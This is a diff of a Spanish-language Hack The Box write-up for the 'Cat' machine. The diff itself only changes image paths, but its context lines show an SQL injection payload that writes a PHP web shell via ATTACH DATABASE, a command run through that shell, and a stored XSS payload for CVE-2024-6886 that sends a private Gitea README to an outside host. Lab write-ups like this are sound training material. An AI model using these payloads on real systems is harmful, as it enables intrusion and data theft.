@@ -123,12 +123,12 @@ http://cat.htb [200 OK] Apache[2.4.41], Cookies[PHPSESSID], Country[RESERVED][ZZ
 
 Accedo al servicio web en y visualizo una aplicación centrada en una competencia de gatos, donde los usuarios pueden registrarse, iniciar sesión y emitir votos.
 
-![](assets/img/htb-writeup-cat/cat1_1.png)
-![](assets/img/htb-writeup-cat/cat1_2.png)
+![](/assets/img/htb-writeup-cat/cat1_1.png)
+![](/assets/img/htb-writeup-cat/cat1_2.png)
 
 Luego de completar el registro e iniciar sesión, se habilita una nueva funcionalidad denominada "Register Cat", la cual permite subir un formulario con el perfil de la mascota.
 
-![](assets/img/htb-writeup-cat/cat1_3.png)
+![](/assets/img/htb-writeup-cat/cat1_3.png)
 
 ---
 Haciendo fuzzing aparece expuesto el directorio .git, lo que permite recuperar código fuente y recursos internos <a id="exposure-of-information-through-directory-listing" href="#cwe-548" class="cwe-ref">(CWE-548)</a>.
@@ -366,13 +366,13 @@ Mediante esta técnica, creo una nueva base de datos con extensión `.php`, lo q
 catName=cat'); ATTACH DATABASE '/var/www/test.php' as db; CREATE TABLE lol.pwn (stuff text); INSERT INTO lol.pwn (stuff) VALUES ("cmd");-- -&catId=1
 ```
 
-![](assets/img/htb-writeup-cat/cat2_4.png)
+![](/assets/img/htb-writeup-cat/cat2_4.png)
 
 Una vez creada la base de datos maliciosa, accedo al archivo desde el navegador para ejecutar comandos en el sistema bajo el contexto del servidor web `www-data`.
 
 * `http://cat.htb/test.php?cmd=id`
 
-![](assets/img/htb-writeup-cat/cat2_5.png)
+![](/assets/img/htb-writeup-cat/cat2_5.png)
 
 Con este acceso, puedo obtener una shell básica como `www-data`, lo que me permite interactuar directamente con el sistema y acceder a la base de datos original, incluyendo los datos previamente identificados en la tabla `users`.
 
@@ -478,7 +478,7 @@ Accedo al buzón de `axel` y encuentro dos mensajes relevantes
 axel@cat:~$ cat /var/mail/axel
 ```
 
-![](assets/img/htb-writeup-cat/cat3_1.png)
+![](/assets/img/htb-writeup-cat/cat3_1.png)
 
 El primer correo, enviado por `rosa`, solicita que `axel` envíe información sobre su repositorio de Gitea a `jobert@localhost`, destacando que se evaluará la viabilidad del servicio propuesto.
 
@@ -529,7 +529,7 @@ Una vez establecido el túnel, accedo a `http://localhost:3000` desde el navegad
 
 Esta versión específica es vulnerable a [CVE-2024-6886](https://nvd.nist.gov/vuln/detail/cve-2024-6886), una vulnerabilidad de Stored Cross-Site Scripting <a href="#cwe-79" class="cwe-ref">(CWE-79)</a>. El fallo se origina por una neutralización incorrecta de entradas durante la generación de páginas web, permitiendo la ejecución de scripts maliciosos dentro del contexto de la sesión autenticada.
 
-![](assets/img/htb-writeup-cat/cat3_2.png)
+![](/assets/img/htb-writeup-cat/cat3_2.png)
 
 ---
 ### Exploitation for Client Execution
@@ -550,7 +550,7 @@ El payload inyectado en la descripción del proyecto consiste en un enlace con c
 <a href='javascript:fetch("http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md").then(response => response.text()).then(data => fetch("http://10.10.16.75:8000/?exfil="+btoa(data)));'>XSS</a>
 ```
 
-![](assets/img/htb-writeup-cat/cat3_4.png)
+![](/assets/img/htb-writeup-cat/cat3_4.png)
 
 Para que el campo vulnerable sea procesado correctamente por el visor de Gitea en la ruta `http://127.0.0.1:3000/axel/test`, era necesario inicializar el repositorio localmente, activarlo y realizar un push del contenido hacia el servidor.
 
@@ -630,7 +630,7 @@ Actualicé la descripción del proyecto con nuevo código que apunta al archivo 
 )();'>XSS</a>
 ```
 
-![](assets/img/htb-writeup-cat/cat3_5.png)
+![](/assets/img/htb-writeup-cat/cat3_5.png)
 
 Dado que existe un proceso que elimina los proyectos realicé un nuevo push para reactivarlo y dejar accesible el vector de ejecución.
 
